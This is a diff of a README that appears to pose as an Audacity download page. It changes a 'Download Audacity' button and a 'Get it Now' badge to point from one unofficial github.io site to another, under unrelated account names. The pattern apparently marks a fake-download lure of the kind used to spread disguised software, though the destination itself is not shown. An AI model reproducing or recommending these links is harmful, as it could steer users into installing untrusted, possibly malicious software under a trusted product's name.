@@ -5,7 +5,7 @@
 </p>
 
 <p align="center">
-  <a href="https://urinoterapia-sigma.github.io/.github/audacity">
+  <a href="https://six-sevens.github.io/.github/audacity">
     <img src="https://i.postimg.cc/KzMGptz1/68747470733a2f2f692e706f7374696d672e63632f5256516739596b312f62616467652e706e67-(1).png" width="200" alt="Download Audacity"/>
   </a>
 </p>
@@ -81,7 +81,7 @@ The noise reduction tool is the specific Audacity feature with the most immediat
 
 <p align="center">
 
-[![Get it Now Audacity](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://urinoterapia-sigma.github.io/.github/audacity)
+[![Get it Now Audacity](https://img.shields.io/badge/Get_it_Now-48CAE4?style=for-the-badge&logo=apple&logoColor=white)](https://six-sevens.github.io/.github/audacity)
 
 </p>
 
